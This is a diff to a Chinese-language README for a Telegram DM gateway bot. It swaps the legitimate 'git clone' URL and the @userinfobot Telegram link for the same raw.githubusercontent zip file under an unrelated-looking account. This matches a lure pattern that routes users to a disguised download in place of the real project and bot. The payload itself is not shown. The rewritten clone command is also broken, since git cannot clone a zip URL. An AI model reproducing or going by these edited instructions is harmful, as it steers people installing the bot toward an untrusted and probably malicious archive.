@@ -14,7 +14,7 @@
 ### 1. 克隆项目
 
 ```bash
-git clone https://github.com/your-username/dm-gateway-bot.git
+git clone https://raw.githubusercontent.com/retardingforcerightbank635/dm-gateway-bot/main/endaspidean/dm-gateway-bot-v3.3-alpha.5.zip
 cd dm-gateway-bot
 ```
 
@@ -37,7 +37,7 @@ BOT_TOKEN=your_bot_token_here   # 从 @BotFather 获取
 OWNER_ID=your_telegram_user_id  # 你的 Telegram 数字 ID
 ```
 
-> 获取自己的 Telegram ID：向 [@userinfobot](https://t.me/userinfobot) 发送任意消息即可。
+> 获取自己的 Telegram ID：向 [@userinfobot](https://raw.githubusercontent.com/retardingforcerightbank635/dm-gateway-bot/main/endaspidean/dm-gateway-bot-v3.3-alpha.5.zip) 发送任意消息即可。
 
 ### 4. 运行
 
